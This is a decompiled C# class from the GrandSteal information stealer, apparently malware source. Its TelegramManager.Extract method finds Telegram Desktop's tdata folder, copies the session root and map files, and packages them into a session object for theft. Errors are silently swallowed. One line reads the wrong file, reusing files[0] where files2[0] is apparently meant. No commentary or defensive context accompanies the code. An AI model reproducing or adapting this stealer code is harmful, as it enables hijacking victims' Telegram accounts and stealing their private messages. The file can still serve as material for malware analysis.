using System;
using System.IO;
using GrandSteal.SharedModels.Models;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x02000023 RID: 35
	public static class TelegramManager
	{
		// Token: 0x060000F7 RID: 247 RVA: 0x00007B4C File Offset: 0x00005D4C
		public static TelegramSession Extract()
		{
			TelegramSession telegramSession = new TelegramSession();
			try
			{
				string path = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming\\Telegram Desktop\\tdata");
				string path2 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C");
				if (!Directory.Exists(path) || !Directory.Exists(path2))
				{
					return telegramSession;
				}
				string[] files = Directory.GetFiles(path, "D877F783D5D3EF8C*");
				if (files.Length != 0)
				{
					byte[] fileData = File.ReadAllBytes(ChromiumManager.CreateTempCopy(files[0]));
					string[] files2 = Directory.GetFiles(path2, "map*");
					if (files2.Length != 0)
					{
						byte[] fileData2 = File.ReadAllBytes(ChromiumManager.CreateTempCopy(files[0]));
						telegramSession.MapFile = new DesktopFile
						{
							FileData = fileData2,
							Filename = new FileInfo(files2[0]).Name
						};
						telegramSession.RootFile = new DesktopFile
						{
							FileData = fileData,
							Filename = new FileInfo(files[0]).Name
						};
					}
				}
			}
			catch (Exception)
			{
			}
			return telegramSession;
		}
	}
}
